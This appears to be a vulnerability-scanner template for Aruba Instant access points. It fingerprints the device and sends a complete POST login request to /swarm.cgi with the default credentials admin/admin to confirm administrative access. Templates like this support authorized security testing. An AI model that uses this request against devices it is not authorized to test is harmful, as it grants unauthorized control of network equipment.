name: Aruba_Instant_password_vulnerability
transport: http
detail:
  dock: body="jscripts/third_party/raphael-treemap.min.js" || body="jscripts/third_party/highcharts.src.js"
  product: Instant
  homepage: https://www.aruba.com/
  impact: <p>Aruba Instant is an AP device. The device has a default password, and
    attackers can control the entire platform through the default password admin/admin
    vulnerability, and use administrator privileges to operate core functions.<br></p>
  description: <p>Aruba Instant is an AP device. The device has a default password,
    and attackers can control the entire platform through the default password admin/admin
    vulnerability, and use administrator privileges to operate core functions.<br></p>
rules:
  r1:
    method: POST
    path: /swarm.cgi
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: opcode=login&user=admin&passwd=admin&refresh=false&nocache=0.17699820340903838
    expression: response.status == 200 && response.body.bcontains(b'sid') && response.body.bcontains(b'Admin')
expression: r1()
